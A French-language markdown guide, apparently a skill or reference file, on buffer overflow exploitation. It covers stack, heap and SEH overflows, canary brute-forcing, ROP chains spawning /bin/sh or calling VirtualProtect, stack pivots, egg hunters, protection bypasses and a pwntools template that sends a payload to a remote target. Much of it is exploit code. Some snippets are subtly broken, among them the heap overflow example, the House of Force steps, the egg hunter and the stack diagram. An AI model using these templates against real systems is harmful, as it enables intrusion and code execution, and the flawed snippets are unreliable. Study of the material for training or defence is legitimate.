---
name: buffer-overflow
description: Buffer Overflow — exploitation de stack/heap/SEH, ROP chains, canary bypass, egg hunters et développement d'exploits Windows/Linux
tags: [buffer-overflow, BOF, stack, heap, SEH, ROP, exploit, windows, linux]
version: 1.0
---

# Buffer Overflow

Guide avancé d'exploitation des buffer overflows — de l'identification à l'exploitation fiable avec contournement de protections.

## 1. Types de Buffer Overflow

### Stack Overflow (débordement de pile)
```
[HIGH ADDR]
+----------------+  ← ESP pointe ici
|  shellcode...  |
|  (buffer local)|
+----------------+
|  saved EBP     |  ← 4 bytes
+----------------+
|  return addr   |  ← 4 bytes : on écrit ici
+----------------+
|  arguments     |
+---+----------+
|  ...   (stack higher)
[LOW ADDR]
```

### Heap Overflow
```c
// Contiguïté mémoire dans le tas
chunk_A = malloc(64);   // [header A][data A][header B][data B]
chunk_B = malloc(64);   // écraser data A → header B corrompu
strcpy(chunk_B, data_overflow);  // déborde dans chunk_B's header/metadata
```

### SEH Overflow (Windows Structured Exception Handler)
```
// Exploitation via SEH chain
// Chain: [exception_registration][next][handler]
// Écraser SEH handler → contrôle avant __except()
[ padding ][nSEH: pop pop ret][SEH: jmp 06 ][shellcode...]
```

## 2. Détection du Pattern Offset

### Méthode Cyclique (Windows / Linux)
```bash
# Générer pattern unique
msf-pattern_create -l 3000
# ou pwntools
python3 -c "from pwn import *; print(cyclic(3000))"

# Trouver offset (Windbg)
!pattern_offset <valeur dans EIP>

# pwntools
python3 -c "from pwn import *; print(cyclic_find('laaa'))"
```

### Mona.py (Windbg)
```
!mona pattern_offset 0x37634136   # Valeur EIP
!mona findmsp                      # Scan automatisé
```

## 3. Contournement de Stack Canary

### Brute-force Canary (Fork serveur)
```python
# Canary = 4 bytes (Linux) ou 8 bytes (x64)
# Le premier byte est \x00 (terminator)
# Technique : brute-force byte par byte

from pwn import *
canary = b'\x00'
for i in range(3):  # Bruteforce les 3 bytes restants
    for b in range(256):
        p = remote('target', 1337)
        p.send(b'A' * 72 + canary + bytes([b]))
        response = p.recv()
        if b'stack smashing' not in response:  # Canary trouvé
            canary += bytes([b])
            break
        p.close()
```

### Info Leak (read canary via autre vulnérabilité)
```
# Si format string ou stack leak disponible
# Lire le canary directement depuis la stack
payload = "%13$p"  # Ajuster position selon la stack
```

## 4. ROP — Return-Oriented Programming

### ROP Chains Windows (x64)

```python
from pwn import *

# Trouver gadgets
pop_rcx = 0x140003212   # pop rcx; ret
pop_rdx = 0x140003456   # pop rdx; ret
pop_r8  = 0x140004789   # pop r8; ret
pop_r9  = 0x140003abc   # pop r9; ret
jmp_rsp = 0x140003def   # jmp rsp

# VirtualProtect ROP chain
rop = [
    pop_rcx, page_addr,        # lpAddress
    pop_rdx, 0x1000,           # dwSize
    pop_r8,  0x40,             # PAGE_EXECUTE_READWRITE
    pop_r9,  writeable_ptr,    # lpOldProtect
    jmp_rsp,                   # Sauter au shellcode
    shellcode                  # Shellcode après la chain
]
```

### ROP Linux x64
```python
# sys_execve("/bin/sh", NULL, NULL)
pop_rdi = 0x4006e2
pop_rsi = 0x4006e0
pop_rdx = 0x4006de   # si disponible

rop = [
    pop_rdi, binsh_addr,
    pop_rsi, 0,
    pop_rdx, 0,
    syscall_addr    # syscall
]
```

### Stack Pivoting
```asm
; Quand stack frame trop petit pour ROP chain
; Réorienter ESP/RSP vers buffer contrôlable
; Gadgets : xchg <reg>, esp; ret
;           leave; ret  (mov esp, ebp; pop ebp; ret)

python3 -c "
from pwn import *
# Gadget xchg eax, esp; ret
# placer EAX = adresse du buffer secondaire
payload = b'A'*offset + pack('<I', pivot_addr) + b'B'*4 + chain_rop
"
```

## 5. Egg Hunter

Quand le buffer est trop petit pour le shellcode, on place un egg hunter.

```asm
; Egg Hunter x86 Windows (NtAccessCheckAndAuditAlarm)
; Egg = "W00T" (4 bytes signatures)
;
; Technique : scanner la mémoire de l'espace utilisateur
; par pages de 4KB en appelant NtAccessCheckAndAuditAlarm

; Alternative : syscall NtDisplayString (Windows)

; x86 Linux egg hunter
; Egg : \x90\x50\x90\x50 (NOP + push eax + NOP + push eax)
egghunter:
    inc edi                   ; Avancer
    push 2
    pop ecx                   ; Compteur = 2
    mov eax, edi
    cdq
    mov esi, 0x50905090       ; Egg
    nop
    repe scasd                ; Comparer ECX DWORDs
    jne egghunter
    jmp edi                   ; Egg trouvé → sauter
```

## 6. SEH Overflow (Windows)

### Structure SEH
```c
// _EXCEPTION_REGISTRATION_RECORD
struct {
    struct _EXCEPTION_REGISTRATION_RECORD *Next;  // nSEH
    PEXCEPTION_ROUTINE Handler;                     // SEH handler
};

// Exploitation : écraser Handler
// Technique : pop pop ret pour sauter sur nSEH
```

### Exploitation SEH
```python
payload = b'A' * handler_offset   # Jusqu'au SEH chain
payload += b'\xeb\x06\x90\x90'    # nSEH : jmp short +6 (sauter SEH)
payload += pack('<I', ppr_addr)   # SEH : pop pop ret gadget
payload += b'\x90' * 8            # NOP sled
payload += shellcode               # Shellcode final
```

### Trouver POP POP RET
```bash
# Mona.py
!mona seh

# ROPgadget
ROPgadget --binary target.exe | grep "pop r.. ; pop r.. ; ret"
ROPgadget --binary target.exe | grep "pop .* ; pop .* ; ret$"
```

## 7. Protections et Bypass par Type

### Linux
| Protection | Commande vérification | Bypass |
|------------|----------------------|--------|
| **NX** | `checksec --file=bin` | ROP / ret2libc |
| **ASLR** | `/proc/sys/kernel/randomize_va_space` | Partial overwrite, info leak |
| **Stack Canary** | `checksec` | Brute-force, info leak |
| **PIE** | `file bin` (shared object) | Partial overwrite, info leak |
| **RELRO** | `checksec --file=bin` | GOT overwrite si partiel |

### Windows
| Protection | Vérification | Bypass |
|------------|-------------|--------|
| **GS(/GS)** | `dumpbin /headers` | Bruteforce 4 bytes, info leak |
| **SafeSEH** | `dumpbin /loadconfig` | Modules sans SafeSEH |
| **ASLR(DYNAMICBASE)** | `dumpbin /dlls` | Modules sans ASLR (non-DYNAMICBASE) |
| **DEP(NXCOMPAT)** | `dumpbin /headers` | ROP + VirtualProtect |
| **SEHOP** | `dumpbin /loadconfig` | Modules sans SEHOP |
| **CFG** | `dumpbin /loadconfig` | Adresses valides CFG |

## 8. Heap Exploitation Avancée

### Use-After-Free (UAF)
```
1. Allouer objet A     [A] heap
2. Free(A)             [FREE]
3. Allouer B (même type) [B] même zone
4. Utiliser A → contrôle de B → exécution
```

### Write-What-Where via Linux tcache
```bash
# tcache poisoning (glibc >= 2.26)
# Corrompre tcache->next pour allouer à adresse arbitraire
# Technique : double free + tcache_put
```

### House of Force / House of Spirit
```python
# House of Force : corrompre top chunk size
# pour faire malloc() revenir sur adresse arbitraire
top_chunk = malloc(size)  # écraser top_chunk->size = 0xFFFFFFFF
malloc(target - base - 0x20)  # forcer retour à target
malloc(shellcode_size)         # Retourne à target
```

## 9. Scripts pwntools Patterns

### Template Exploit
```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'   # ou 'amd64'
context.os = 'linux'
context.log_level = 'debug'

# Connexion
if args.LOCAL:
    p = process('./vuln')
    if args.GDB:
        gdb.attach(p, gdbscript='b main\nc')
else:
    p = remote('target.com', 4444)

# Offset
offset = 72  # via cyclic

# Construire exploit
payload = b'A' * offset
payload += pack('<I', 0xdeadbeef)  # EIP/RIP

# Envoyer
p.sendline(payload)
p.interactive()
```

## 10. Checklist Exploitation

- [ ] Reverse engineer le binaire (Ghidra/IDA)
- [ ] Identifier le type de vulnérabilité (stack/heap/SEH)
- [ ] Tester offset EIP/RIP avec pattern cyclique
- [ ] Vérifier protections (checksec, dumpbin)
- [ ] Choisir bypass ASLR (info leak / partial overwrite)
- [ ] Construire ROP chain vs DEP/NX
- [ ] Gérer stack pivot si buffer trop petit
- [ ] Ajouter egg hunter si nécessaire
- [ ] Tester exploit avec retenu (~5 tirs)
- [ ] Valider sur machine cible identique

## 11. Pitfalls

- **Canary à zéro** : premier byte du canary est `\x00` — ne pas écrire par-dessus
- **ASLR reboot** : les adresses changent à chaque boot sauf si modules non-ASLR
- **ROP chain > buffer** : nécessite stack pivot vers buffer secondaire
- **SEH chain** : ne pas oublier `\xeb\x06\x90\x90` + pop pop ret
- **Fonction non-resolved** : appeler GetProcAddress avant si fonction pas dans IAT
- **32/64-bit calling convention** : parameters registers vs stack

## 12. Ressources

- **Corelan Security** : https://www.corelan.be (best tutorial series)
- **FuzzySecurity** : https://fuzzysecurity.com/tutorials.html
- **ROP Emporium** : https://ropemporium.com (practice challenges)
- **Nightmare** : https://github.com/guyinatuxedo/nightmare
- **pwn.college** : https://pwn.college (Arizona CTF course)
- **ShellStorm** : http://shell-storm.org/shellcode
- **Exploit Education** : https://exploit.education